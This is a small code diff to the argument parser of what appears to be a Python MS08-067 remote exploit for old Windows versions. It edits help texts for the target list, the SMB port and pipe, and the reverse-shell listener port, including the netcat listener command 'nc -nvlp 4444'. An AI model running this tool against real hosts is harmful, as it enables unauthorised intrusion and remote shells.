@@ -25,16 +25,16 @@ except ImportError:
 
 parser = argparse.ArgumentParser()
 parser.add_argument("ip", help="input the ip of the host", type=str)
-parser.add_argument("target", help="input your network adapter (ex: tun0)",
+parser.add_argument("target", help="1|Windows XP SP0/SP1 Universal, 2|Windows 2000 Universal, 3|Windows 2003 SP0 Universal, 4|Windows 2003 SP1 English, 5|Windows XP SP3 French (NX), 6|Windows XP SP3 English (NX), 7|Windows XP SP3 English (AlwaysOn NX)",
                     type=int, choices=[1, 2, 3, 4, 5, 6, 7])
 parser.add_argument(
     "adapter", help="input your network adapter (ex: tun0)", type=str)
 parser.add_argument(
-    "local_port", help="input your reverse port (ex: 4444) --> nc -nvlp 4444", type=int)
+    "local_port", help="input your local port (ex: 4444) --> nc -nvlp 4444", type=int)
 parser.add_argument(
-    "-pipe", help="input the pipe (https://github.com/k4u5h41/MS17-010_CVE-2017-0143/blob/main/checker.py)", type=str, default='browser')
+    "-pipe", help="(optional) input the pipe, default browser --> (https://github.com/k4u5h41/MS17-010_CVE-2017-0143/blob/main/checker.py)", type=str, default='browser')
 parser.add_argument(
-    "-port", help="input the port (MS08-067)", type=int, default=445)
+    "-port", help="(optional) input the port, default 445", type=int, default=445)
 
 args = parser.parse_args()
 ip = args.ip
